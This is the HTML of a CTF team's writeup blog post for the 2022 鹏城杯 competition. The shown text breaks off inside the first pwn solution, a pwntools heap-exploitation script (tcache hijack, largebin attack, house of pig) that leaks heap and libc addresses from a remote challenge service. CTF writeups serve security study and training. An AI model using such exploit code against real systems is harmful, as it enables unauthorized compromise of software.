<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2022 鹏城杯 SU Writeup -</title><meta name=description content="以下是我们 SU 本次2022 鹏城杯 的 writeup
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/pcb-2022-su-wu\/","name":"2022 鹏城杯 su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2022 鹏城杯 SU Writeup","description":"以下是我们 SU 本次2022 鹏城杯 的 writeup 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)\n","inLanguage":"en","wordCount":4818,"datePublished":"2022-07-04T17:50:45\u002b00:00","dateModified":"2022-07-04T17:50:45\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["鹏城杯"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/pcb-2022-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2022 鹏城杯 SU Writeup"><meta property="og:description" content="以下是我们 SU 本次2022 鹏城杯 的 writeup
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/pcb-2022-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2022 鹏城杯 SU Writeup"><meta name=twitter:description content="以下是我们 SU 本次2022 鹏城杯 的 writeup
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2022 鹏城杯 SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on July 4, 40745
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;23&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;4818&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#pwn>pwn</a><ul><li><a href=#rainbowcat>rainbowcat</a></li><li><a href=#arm_protocol>arm_protocol</a></li><li><a href=#fruitshop>fruitshop</a></li></ul></li><li><a href=#crypto>crypto</a><ul><li><a href=#easy_rsa>easy_rsa</a></li><li><a href=#baby_rsa>baby_rsa</a></li></ul></li><li><a href=#web>web</a><ul><li><a href=#简单包含>简单包含</a></li><li><a href=#简单php>简单php</a></li><li><a href=#ez_java>Ez_java</a></li><li><a href=#can_u_login>can_u_login</a></li><li><a href=#高手高手高高手>高手高手高高手</a></li><li><a href=#easygo>easygo</a></li><li><a href=#easysql>easysql</a></li><li><a href=#压缩包>压缩包</a></li></ul></li><li><a href=#misc>misc</a><ul><li><a href=#简单取证>简单取证</a></li><li><a href=#misc_water>Misc_water</a></li><li><a href=#what_is_log>what_is_log</a></li><li><a href=#babybit>babybit</a></li></ul></li><li><a href=#re>re</a><ul><li><a href=#baby_re>baby_re</a></li><li><a href=#gocode>gocode</a></li><li><a href=#rota>rota</a></li><li><a href=#maze>maze</a></li></ul></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>以下是我们 SU 本次2022 鹏城杯 的 writeup
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p><h2 id=pwn>pwn</h2><h3 id=rainbowcat>rainbowcat</h3><p><strong>hijack tcache struct + largebin attack + house of pig + orw</strong>`</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span> <span class=o>=</span> <span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#p = process(&#34;./pwn&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;192.168.1.102&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc-2.33.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>new</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;get? &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;abandon? &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;name: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;one?&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;cat: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=n>new</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x66</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>key</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>));</span> <span class=n>heap_base</span> <span class=o>=</span> <span class=n>key</span> <span class=o>&lt;&lt;</span> <span class=mi>12</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span> <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>((</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>^</span> <span class=n>key</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span> <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>key</span> <span class=o>^</span> <span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x90</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span> <span class=n>new</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x350</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x431</span><span class=p>));</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x780</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>));</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x360</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>show</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x1e0c00</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x290</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xa1</span><span class=p>));</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x2a0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x7b0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x421</span><span class=p>));</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x7c0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span> <span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span> <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x370</span><span class=p>))</span>
